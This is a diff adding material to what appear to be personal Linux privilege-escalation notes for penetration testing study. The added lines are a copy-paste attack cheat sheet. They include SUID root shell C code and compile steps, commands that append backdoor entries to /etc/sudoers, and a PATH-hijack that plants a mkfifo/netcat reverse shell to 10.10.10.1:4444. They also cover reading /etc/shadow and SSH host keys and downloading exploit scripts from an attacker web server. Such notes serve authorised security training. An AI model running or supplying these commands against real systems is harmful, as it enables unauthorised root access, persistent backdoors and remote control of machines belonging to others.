@@ -7,14 +7,133 @@
 - Kernel:
 - Workgroup:
 - Windows domain:
+- Kernel exploits
+- Cleartext password
+- Reconfigure service parameters
+- Programs running as root
+- Installed software
+- Weak/reused/plaintext passwords
+- Inside service
+- Installed software
+- Scheduled tasks
+- Weak passwords
+- Suid misconfiguration
+- World writable scripts invoked by root
+- Unmounted filesystems
+- Private ssh keys
+- Bad path configuration
+- Cronjobs
 
-----------------------------------------------------------------------------
+### Privilege escalation quick links
 
-'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''
+#### Escaping limited shells
 
------------------------------------------------------------------------------
+#### Shell Exploitation
 
-## Privilege escalation
+#### reverse-shell-cheat-sheet
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+#### 7 Linux Shells Using Built-in Tools
+
+http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/          
+
+#### Creating Metasploit Payloads
+
+https://netsec.ws/?p=331
+
+#### escaping restricted linux shells
+
+https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
+
+#### Breaking out of rbash using scp
+
+http://pentestmonkey.net/blog/rbash-scp
+
+#### shellcatraz
+
+https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
+
+#### escaping restricted shells
+
+http://securebean.blogspot.ca/2014/05/escaping-restricted-shell_3.html
+
+#### attacking restricted shells
+
+https://blog.netspi.com/attacking-restricted-linux-shells/
+
+### escape shell commands
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+echo os.system('/bin/bash')
+
+/bin/sh -i
+
+#### Go from rbash to bash
+
+1.	find a file that you can write and execute to 
+
+2.	find the tee file
+
+3.	watch the quotes in the command below.
+
+4.	echo '/bin/bash';|tee -a './bin/ping'
+
+5.	echo the bin/bash shell into the ping tool and execute the ping tool
+
+6.	basically you are appending the bin/bash to ping tool and executing
+
+7.	cd /home
+
+8.	now we are bash
+
+#### try to root the server tricks
+
+https://www.youtube.com/watch?v=SoUrcesP9ek
+
+1.	we have to set the path for bash first
+
+2.	export PATH=*dollar-sign*PATH:/usr/bin/
+
+2.	no we need to search cron job, to see if anything I found is vulnerable
+
+3.	cd /etc/cron.minutely/
+
+4.	ls
+
+5.	check all running cron jobs
+
+6.	ls -ls file
+
+7.	you need to write if not try other things
+
+8.	cat file
+
+9.	see if file is running other files
+
+10.	check permissions on other files
+
+10.	hopefully they are running as 777
+
+11.	appended things to other files
+
+12.	nano file
+
+13.	do things like cp /bin/sh /home/restricted1/unkownendevice64 && chmod 4755
+
+14.	give you root privs to run this shell
+
+
+### Setting the SUID sticky bit
+
+chmod 777 lin86-reverse-met-603.elf
+
+chmod +x lin86-reverse-met-603.elf
+
+chmod 4777 lin86-reverse-met-603.elf
+
+#### Privilege escalation
 
 Now we start the whole enumeration-process over gain.
 
@@ -34,18 +153,13 @@ Less likely
 - Cronjobs
 
 
-### To-try list
-
-Here you will add all possible leads. What to try.
-
-
 ### Useful commands
 
 
-###  Spawning shell
+####  Spawning shell
 python -c 'import pty; pty.spawn("/bin/sh")'
 
-### if commands are limited, you break out of the "jail" shell?
+### you break out of the "jail" shell?
 
 python -c 'import pty;pty.spawn("/bin/bash")'
 
@@ -66,14 +180,16 @@ exec /bin/bash
 /bin/dash
 
 
-# Access to more binaries
+### Access to more binaries
+
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
-# Set up webserver
+### Set up webserver
 
 cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080
 
-# Download all files
+### Download all files
+
 wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py 
 
 unix-privesc-check
@@ -85,13 +201,14 @@ python linprivchecker.py extended
 ./unix-privesc-check standard
 
 
-# Writable directories
+### Writable directories
+
 /tmp
 
 /var/tmp
 
 
-# Add user to sudoers
+### Add user to sudoers
 
 echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
 
@@ -111,9 +228,68 @@ echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
 
 **Users with login:**
 
+grep -vE "nologin" /etc/passwd
+
+
+#### What's the OS? What version? What architecture?
+
+•	cat /etc/*-release
+
+•	uname -i
+
+•	lsb_release -a (Debian based OSs)
+
+#### Who are we? Where are we?
+
+•	id
+
+•	pwd
+
+#### Who uses the box? What users? (And which ones have a valid shell)
+
+•	cat /etc/passwd
+
+•	grep -vE "nologin|false" /etc/passwd
+
+#### What's currently running on the box? What active network services are there?
+
+•	ps aux
+
+•	netstat -antup
+
+#### What's installed? What kernel is being used?
+
+•	dpkg -l (Debian based OSs)
+
+•	rpm -qa (CentOS / openSUSE )
+
+•	uname -a
+
+#### Ask yourself can you answer the following questions
+
+•	What user files do we have access to?
+
+•	What configurations do we have access to?
+
+•	Any incorrect file permissions?
+
+•	What programs are custom? Any SUID? SGID?
+
+•	What's scheduled to run?
+
+•	Any hardcoded credentials? Where are credentials kept?
+
+•	looking for the MySQL credential inside the web application
+
+
+and now you are just getting warmed up
 
 
 uname -a
+
+uname -mrs
+
+cat /etc/redhat-release
 
 env
 
@@ -131,11 +307,63 @@ cat /etc/shadow
 
 cat /etc/hosts
 
-# Users with login
+### What files run as root / SUID / GUID?:
+
+```
+find / -perm +2000 -user root -type f -print
+
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+
+for i in `locate -r "bin*dollar-sign*"`; do find *dollar-sign*i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
+
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+
+```
+
+### What folders are world writeable?:
+
+```
+find / -writable -type d 2>/dev/null      # world-writeable folders
+
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+
+find / -perm -o x -type d 2>/dev/null     # world-executable folders
+
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+```
+
+
+
+### LINUX Privilege escalation
+
+Linux Privilege Escalation
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+https://www.youtube.com/watch?v=dk2wsyFiosg
+
+Privilege escalation recon scripts:
+
+http://www.securitysift.com/download/linuxprivchecker.py
+
+http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+
+### Users with login
 
 grep -vE "nologin" /etc/passwd
 
-# Priv Enumeration Scripts
+### Priv Enumeration Scripts
 
 
 upload /unix-privesc-check
@@ -242,6 +470,54 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 
 
+### SUID (Set owner User ID up on execution)
+
+below are some quick copy and paste examples for various shells:
+
+```
+SUID C Shell for /bin/bash  
+
+  int main(void){  
+  setresuid(0, 0, 0);  
+  system("/bin/bash");  
+  }  
+
+  SUID C Shell for /bin/sh  
+
+  int main(void){  
+  setresuid(0, 0, 0);  
+  system("/bin/sh");  
+  }  
+
+  Building the SUID Shell binary  
+  gcc -o suid suid.c  
+  For 32 bit:  
+  gcc -m32 -o suid suid.c
+
+
+```
+
+Create and compile an SUID from a limited shell (no file transfer)
+
+```
+echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" > privsc.c gcc privsc.c -o privsc
+
+```
+Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:
+
+```
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+
+```
+You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead. In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.
+
+```
+set PATH="/tmp:/usr/local/bin:/usr/bin:/bin" echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 > tmp/f" >> /tmp/ssh chmod +x ssh
+
+
+```
+
+
 ### Unmounted filesystems
 
 Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.
@@ -296,6 +572,36 @@ cat /etc/ssh/ssh_host_key
 
 Require user interaction
 
+
+#### POST Exploitation FOR Unix
+
+#### unix-privesc-check
+
+#### Linux scripts for PRIV Escalation.py, sh, pl
+
+viper-shell/application/modules/post/Privilege-Escalation/Linux/Post Exploitation Scripts/
+
+#### POST Exploitation FOR Linux
+
+#### Linux
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+#### Linuxenum.sh
+
+Located in viperhome/application/modules/post
+
+#### Linux exploit suggester
+
+Located in viperhome/application/modules/post
+
+#### Linux PRIV Checker
+
+Located in viperhome/application/modules/post
+
+#### Linux PRIV Escalation scripts for .py, sh, pl
+
+viper-shell/application/modules/post/Privilege-Escalation/Linux/Post Exploitation Scripts/
 
 
 ------------------------------------------------------------------------
@@ -399,4 +705,3 @@ echo $GDMSESSION
 ```
 
 ## How to replicate:
-![image.png](attachment:image.png)
